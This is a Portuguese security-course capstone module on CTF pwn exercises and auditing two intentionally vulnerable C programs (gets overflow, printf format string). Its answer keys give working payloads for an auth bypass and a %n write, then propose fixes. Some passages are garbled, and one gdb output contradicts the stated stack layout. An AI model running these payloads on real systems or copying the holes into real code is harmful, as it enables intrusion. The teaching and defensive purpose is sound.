4.10

Capstone: CTF pwn + auditoria definitiva

Explorar dois binários de CTF e auditar/corrigir código C real

Nível: Avançado/Cyber Duração: ~50 min Pré-requisitos: T4.04–T4.09 (ferramentas, overflow, mitigações, format string, heap, redes)

🎯 Objetivos

Prova final da trilha em dois braços: (1) OFENSIVO — resolver dois desafios de pwn em plataformas éticas (pwn.college "Shellcode Injection" ou Exploit Education "Phoenix stack-series"), escrevendo exploit e um writeup em markdown; (2) DEFENSIVO — auditar dois programas C fornecidos (ctf1.c e ctf2.c), identificar 3+ vulnerabilidades com CWE, linha, impacto e explotabilidade, e propor correções com diff.

📖 Leitura guiada

Foco da leitura: Use o pwn.college (https://pwn.college/) módulos de programmability/shellcode e o Exploit Education (https://exploit.education/) — série Phoenix (stack-series). Reforce com vídeos do LiveOverflow ("Buffer overflow exploits" e "Format string") e, para a parte defensiva, use o CWE Top 25 (https://cwe.mitre.org/data/definitions/934.html) como checklist na hora de classificar os achados.

A missão, em mapas de duas estradas

Este é o módulo em que tudo converge. Você vai (1) resolver dois binários reais de CTF das plataformas éticas indicadas — explorando de verdade, mas dentro do sandbox deles; e (2) auditar dois binários que eu forneço (ctf1.c e ctf2.c), encontrando as vulnerabilidades com o vocabulário CWE e propondo correção com diff. A entrega: um diretório ~/labs/4.10 com dois writeups e um relatório de auditoria.

As plataformas de CTF são espaços projetados para isso: você recebe o binário, o servidor de teste e a permissão escancarada de atacar aquele binário. Nada disso autoriza atacar qualquer outro sistema — a regra ética da trilha continua valendo.

Braço ofensivo: escolha e método

Escolha um dos dois pacotes (não precisa fazer os dois):

  • pwn.college — programmability (shellcode injection): programas mínimos que lêem shellcode e o executam — variação pura da ideia do módulo 05, com buffer e exec direto. /esté exatamente o repertório que construímos.
  • Exploit Education — Phoenix (stack-series): binários com overflow clássico, format string e ret2libc, prontos para rodar localmente no seu lab (os mesmos padrões dos módulos 05-07).
  • Regra da prova: resolva pelo menos 2 binários de uma das séries. Sugestão de rota: um overflow simples (ex.: stack-zero/one do Phoenix) + um format string ou ret2libc.

A entrega ofensiva: o writeup

Para cada binário resolvido, um arquivo writeup_.md com a anatomia de um writeup profissional:

  • Resumo: o que o binário faz e qual a classe de bug (com CWE).
  • Verificação: checksec transcrito e interpretado (NX/PIE/canário/RELRO).
  • Análise: desenho da frame/vetor (offset, endereços, leak) com evidências do gdb.
  • Exploit: o payload completo (ou script) e os comandos de execução.
  • Prova: output com a flag/cat do arquivo de flag (nas plataformas) ou shell obtida.
  • Defesa: como você corrigiria aquele bug e quais mitigações faltavam.

Braço defensivo: o método de auditoria

Antes de ler os binários, o método que você vai aplicar (e repetir na vida real):

  • 1. Inventário de entrada: liste todos os pontos onde o programa lê dados externos (argv, stdin, arquivo, rede) — é onde bugs vivem.
  • 2. Caça de copy/format: procure gets, strcpy, strcat, sprintf, printf(var).
  • 3. Caça de aritmética: tamanhos, índices, subtrações unsigned, off-by-one.
  • 4. Caça de vida/morte: malloc/free pareados? ponteiro reaproveitado?
  • 5. Confirmar com ferramentas: compilar com sanitizers/valgrind e reproduzir.
  • 6. Registrar: cada achado com (a) CWE, (b) linha, (c) impacto, (d) explotabilidade (trivial/média/baixa) e (e) correção proposta.

Binário 1 da auditoria: ctf1.c

Um "terminal"zinho de senha — três vulnerabilidades da nossa trilha num só arquivo. Compile-o e explore você mesmo antes de ver o gabarito.

Código — ctf1.c (VULNERÁVEL)
/* ctf1.c -- binario didatico de auditoria (VULNERAVEL).
   Compile NO LINUX/WSL (didatico): 
   gcc -m32 -fno-stack-protector -no-pie -g ctf1.c -o ctf1
   OBS.: em 64-bit (-m64) os offsets mudam; o texto do gabarito
   usa 32-bit. Numeros nao chutados: meca no seu gdb. */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define SENHA "br1ck3d??"

static void painel_admin(void)
{
    printf("FLAG_EDUCACIONAL{nunca-deploye-isto}\n");
    system("/bin/sh");
}

int main(void)
{
    char senha[32];
    int  permitido = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("== terminal ctf1 ==\nsenha: ");
    gets(senha);                   /* <-- 1a vunerabilidade */

    if (strcmp(senha, SENHA) == 0)
        permitido = 1;

    if (permitido)
        printf("acesso concedido\n");
    else
        printf("negado\n");
    return 0;
}
Saída esperada
$ gcc -m32 -fno-stack-protector -no-pie -g ctf1.c -o ctf1
$ ./ctf1
== terminal ctf1 ==
senha: hehe
negado

Binário 2 da auditoria: ctf2.c

Um "registrador de eventos" com duas fraquezas da trilha. Reproduza o comportamento bugado antes do gabarito.

Código — ctf2.c (VULNERÁVEL)
/* ctf2.c -- binario didatico de auditoria (VULNERAVEL).
   Compile NO LINUX/WSL (didatico):
   gcc -m32 -fno-stack-protector -no-pie -g ctf2.c -o ctf2 */
#include <stdio.h>
#include <string.h>

int nivel = 0;   /* nivel de seguranca global */

int main(void)
{
    char evento[512];

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("== terminal ctf2 ==\ndigite a descricao do evento: ");
    if (fgets(evento, sizeof evento, stdin) == NULL)
        return 1;

    printf("[log] ");
    printf(evento);                  /* <-- vunerabilidade central */

    printf("nivel de seguranca: %s\n",
           nivel == 0 ? "baixo" : "ELEVADO");
    return 0;
}
Saída esperada
$ gcc -m32 -fno-stack-protector -no-pie -g ctf2.c -o ctf2
$ ./ctf2
== terminal ctf2 ==
digite a descricao do evento: tentativa de login
[log] tentativa de login
nivel de seguranca: baixo

Gabarito ctf1.c: os achados

Tabela do que o auditor (você) deve ter achado; reproduza as provas no lab antes de seguir.

  • CWE-242 (Uso de função inerentemente perigosa) / CWE-121 (stack overflow) — linha do gets(senha). Entrada sem limite estoura senha[32]. Impacto: RCE (com a cadeia completa) ou corrupção. Explotabilidade: triviale.
  • CWE-287 (Autenticação imprópria) — o bypass: com 33 bytes (32 de senha + 1 byte 1), o permitido — que vive junto na frame — vira não-zero; o if (permitido) concede independentemente da senha. Distinct do overflow do item anterior (duas CWEs para o mesmo gets).
  • CWE-119 (Falha de limites de memória) — pai das duas acima (o vetor em si). Se preferir manter, classifique como CWE-119 + CWE-121 + CWE-287.
  • Bônus (ret2win): com offset 36 no 32-bit (32 de buffer + 4 do EBP), o payload pode retornar direto para painel_admin — transformando o bug de leitura de flash em código. Prova no gdb.
Código — gabarito ctf1
# prova 1: bypass por estouro do permitido (32-bit)
$ python3 -c "print('A'*32 + '\x01')" | ./ctf1
...
== terminal ctf1 ==
senha: acesso concedido
FLAG_EDUCACIONAL{nunca-deploye-isto}
$ 

# prova 2: ret2win (32-bit) - endereco de painel_admin
$ objdump -t ctf1 | grep painel_admin

Correções ctf1.c (com diff)

Código — correcao ctf1
--- ctf1.c (vulneravel)
+++ ctf1.c (corrigido)
@@ main:
-    char senha[32];
-    int  permitido = 0;
+    char senha[64];
+    int  autenticado = 0;
@@ leitura:
-    gets(senha);                          /* CWE-242/121 */
+    if (fgets(senha, sizeof senha, stdin) == NULL)
+        return 1;                         /* nunca confie em gets */
+    senha[strcspn(senha, "\n")] = '\0';  /* limpa o \n final */
@@ decisao:
-    if (strcmp(senha, SENHA) == 0)
-        permitido = 1;
-    if (permitido)
-        printf("acesso concedido\n");
-    else
-        printf("negado\n");
+    if (strcmp(senha, SENHA) == 0)
+        autenticado = 1;
+    if (autenticado)
+        printf("acesso concedido\n");
+    else
+        printf("negado\n");
@@ simplificar / reduzir superficie:
-    system("/bin/sh");     /* num app real: NAO existe shell sob demanda */
@@ build:
-    gcc -m32 -fno-stack-protector -no-pie ...
+    gcc -O2 -Wall -Wextra -Wformat-security -Werror=format-security \
+        -fstack-protector-all -pie -z relro -z now ctf1.c -o ctf1_hard

Gabarito ctf2.c: os achados

  • CWE-134 (Uncontrolled format string) — printf(evento): a entrada vira format; %p/%x vazam pilha/registradores (leak) — o mesmo vetor que alimenta ret2libc do módulo 06.
  • CWE-119/CWE-787 (escrita fora dos limites real) — via %n: escrever no endereço de nivel (global, endereço fixo em -no-pie) e elevar o nível de segurança sem privilégio. A lógica "nivel != 0 → ELEVADO" é a fraqueza de confiança.
  • Leak de fingerprint: o formato livre permite vazar endereços da libc/PIE — informação que (combinada ao overflow em outra parte do sistema) vira exploit completo.
Código — gabarito ctf2
# prova (32-bit, -no-pie: endereco de nivel e fixo)
$ nm ctf2 | grep ' nivel'
0804a024 B nivel
$ python3 -c 'import struct,sys
addr=0x0804a024
p=struct.pack("<I", addr) + b"%20u" + b"%5$n"
sys.stdout.buffer.write(p)' | ./ctf2
== terminal ctf2 ==
digite a descricao do evento: [log] <20 espacos>
nivel de seguranca: ELEVADO   # o %n gravou 20+n0 no endereco de nivel

Correções ctf2.c (com diff)

Código — correcao ctf2
--- ctf2.c (vulneravel)
+++ ctf2.c (corrigido)
@@ output:
-    printf(evento);                      /* CWE-134 */
+    printf("%s", evento);                /* format explicita, sempre  */
@@ estado:
-    int nivel = 0;   /* global: alvo de escrita */
-    if (nivel == 0) printf("nivel: baixo\n"); else printf("nivel: ELEVADO\n");
+    int nivel = verifica_status();
+    printf("nivel de seguranca: %s\n", nivel ? "ok" : "baixo");
+    /* nada de "escreva num global e vire admin" */
@@ campo minimo da entrada:
-    char evento[512];
+    char evento[256];   /* menor; e mesmo assim so com %s */
@@ build:
+    gcc -O2 -Wall -Wextra -Wformat-security -Werror=format-security \
+        -fstack-protector-all -pie -z relro -z now ctf2.c -o ctf2_hard

Como se defender (checklist final da auditoria)

  • Leia o código procurando ENTRADA, CÓPIA, FORMAT e ESTADO — não linha por linha: primeiro o mapa dos pontos que recebem dados externos.
  • Classe as fraquezas com CWE (é o idioma que engenheiros, GTDs e bots de segurança entendem) e grave linha + impacto + explotabilidade.
  • Reproduza SEMPRE: um bug que não se reproduz em teste não pode ser classificado como "corrigido". Sanitizers e valgrind são o instrumento (rodando no CI).
  • Aplique o combo de mitigação em qualquer build (canário, NX, PIE, FULL RELRO, FORTIFY, format-security) e confirme com checksec.
  • Reduza superfície: menos shell, menos sistemas(), menos globais, menos campos de entrada.
  • Documente: writeup + diff em git review, para que o (próximo) humano entenda o "porquê" além do "o quê".
  • Se você encontrar um bug em código alheio/produção: pare, reporte ao responsável com proposta de correção, não prove nada contra outros sistemas.

Nível 3

Exercício 4.10.1

Sem olhar o gabarito: reproduza o bypass de autenticação do ctf1.c (32-bit) gravando o byte 1 no local "permitido", e depois o ret2win saltando para painel_admin. Anote endereços e offsets SUAS.

Dica: Primeiro meça onde fica permitido em relação a senha (gdb: p &senha, p &permitido). O ret2win: offset = espaco_de_senha + 4 (saved ebp).

Ver solução
$ gdb ./ctf1
(gdb) break 18
(gdb) run
(gdb) p &senha
$1 = (char (*)[32]) 0xbfffefac
(gdb) p &permitido
$2 = (int *) 0xbffff01c   # permitido logo apos senha
(gdb) quit
$ python3 -c "print('A'*32 + '\x01')" | ./ctf1
senha: acesso concedido

Layout real da frame confirmado no gdb — e por isso "33 bytes" muda a leitura do programa: perceba que strcmp compara a FONTE estourada...

Nível 3

Exercício 4.10.2

No ctf2.c, descubra o endereço da global nivel com nm, monte o payload %n que grava um valor pequeno (ex.: %5$n ou %6$n — encontre o índice do seu buffer) e eleve o nível. Depois repita com um offset errado e explique por que o programa sai com SIGSEGV.

Dica: Como em 4.07, o índice do seu buffer no 32-bit se descobre com uma varredura de %N$p.

Ver solução
$ nm ctf2 | grep ' nivel'
0804a024 B nivel
$ python3 -c 'import struct,sys
sys.stdout.buffer.write(struct.pack("<I",0x0804a024)+b"%6$n")' | ./ctf2 || true
# se nao alterar, redescubra o indice do buffer (4.07, exercicio 1)
# e troque %6$n pelo indice certo. Ao acertar -->
# nivel de seguranca: ELEVADO

Obs.: em bash POSIX o escape \$ dentro de aspas duplas é literal; no exercício use aspas simples (como no gabarito) e n-uplo ação de teste.

❓ Verificação rápida

🏗️ Miniprojeto: Capstone completo: 2 writeups + 1 relatório de auditoria

Consolide em ~/labs/4.10: (1) writeup_challA.md e writeup_challB.md dos dois binários de CTF que você resolveu (checksec, análise, exploit, prova, defesa); (2) auditoria_ctf1.md e auditoria_ctf2.md com a tabela de achados (CWE, linha, impacto, explotabilidade, correção) + diffs aplicados; (3) versao_corrigida_ctf1.c e ctf2.c compilando com o combo defensivo e checksec mostrando as proteções ligadas; (4) um README.md de epílogo com 3 lições pessoais da trilha. Lembre: nada de explorer nada fora do lab.

Critérios de aceite

  • 2 writeups completos com exploit reproduzível (ou flag capturada nas plataformas).
  • 2 relatórios de auditoria com no mínimo 3 achados cada (totais) e tabela CWE/linha/impacto/explotabilidade/correção.
  • Versões corrigidas compilando com flags defensivas e checksec com NX/PIE/canário/RELRO adequados.
  • README final com as 3 lições pessoais.
  • Nenhuma evidência de atividade fora do lab (endereços = loopback/plataformas de CTF).
